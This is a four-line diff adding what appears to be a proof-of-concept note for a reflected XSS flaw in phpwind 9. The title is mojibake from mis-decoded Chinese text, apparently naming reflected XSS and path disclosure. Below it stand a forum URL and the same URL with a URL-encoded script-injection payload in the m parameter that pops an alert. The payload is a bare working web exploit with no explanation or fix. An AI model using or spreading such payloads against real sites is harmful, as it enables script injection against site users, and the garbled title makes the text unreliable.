@@ -1,0 +1,4 @@
+phpwind 9 ØËş ·´ÉäXSS + Â·¾¶Ğ¹Â©
+
+http://www.hake.cc/index.php?m=1&c=forum
+ http://www.hake.cc /index.php?m=1%22%3E%3Cscript%3Ealert%28/insight/%29%3C/script%3E&c=forum
